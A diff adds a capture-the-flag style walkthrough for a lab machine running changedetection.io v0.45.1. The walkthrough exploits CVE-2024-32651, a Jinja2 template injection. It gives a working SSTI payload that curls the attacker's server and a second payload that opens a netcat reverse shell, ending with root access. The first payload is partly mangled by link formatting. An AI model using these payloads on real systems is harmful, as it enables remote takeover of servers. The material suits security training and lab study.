@@ -110,7 +110,107 @@ ip a
 <summary>Walkthrough</summary>
 
 ```zsh
+Summary
+The server access is gained by exploiting the change detection web app, which has a publicly available exploit responsible for providing Remote Code Execution (RCE) on the server.
 
+Applications/Servers
+Application-1: Changedetection.io
+Detect website content changes and perform meaningful actions - trigger notifications via Discord, Email, Slack, Telegram, API calls and many more.
+
+Version: v0.45.1
+
+CVE: CVE-2024-32651
+
+CVE Description: changedetection.io is an open source web page change detection, website watcher, restock monitor and notification service. There is a Server Side Template Injection (SSTI) in Jinja2 that allows Remote Command Execution on the server host. Attackers can run any system command without any restriction and they could use a reverse shell. The impact is critical as the attacker can completely takeover the server machine. This can be reduced if changedetection is behind a login page, but this isn't required by the application (not by default and not enforced).
+
+POC/Reference: https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-4r7v-whpg-8rx3
+
+Skills Learned
+CVE
+
+SSTI
+
+Tools Used
+Nmap
+
+Firefox
+
+Nmap
+Starting with an Nmap scan. We have 2 open ports.
+
+nmap -Pn --open <IP> -p-
+
+
+On Port 22:
+
+As default ssh is running.
+
+On Port 5000:
+
+We can see from the title that changedectection.io (version: v0.45.1) is running.
+
+
+
+The version of the changedetection.io webapp can be seen the in the top right of the page i.e v0.45.1.
+
+If we search for the exploit in google, we can find a recent CVE. The running version of change detection is exploitatable to the CVE-2024-32651.
+
+
+
+Exploit
+Exploiting CVE
+Link: https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-4r7v-whpg-8rx3
+
+POC:
+Click on edit button on one of the watch items
+
+
+
+Go to the Notifications tab
+
+
+
+Since we have not setup the notifcations app yet the exploit is going to be blind command injection. Let's first check if the payload is working or not
+
+Start local server
+
+python3 -m http.server 8001
+
+On the Notification Body filed add the below payload
+
+{{ self.**init**.**globals**.**builtins**.**import**('os').popen('curl [http://<IP>:<PORT>').read()](http://192.168.1.75:8001').read()) }}
+
+Note: Replace <IP>:<PORT> with yours respectively
+
+
+
+Save it
+
+As we can see we hit the request. We are now sure that we can execute commands
+
+
+Listen netcat on your local machine
+
+rlwrap ncat -klvnp 1234
+-k - Accept multiple connections in listen mode
+
+Let's get a reverse shell
+
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <IP> <PORT> >/tmp/f').read() }}
+
+Note: Replace <IP>:<PORT> with yours respectively
+
+
+
+Save it
+
+We have the shell
+
+
+
+We are root.
+
+Thank You :)
 ```
 
 </details>
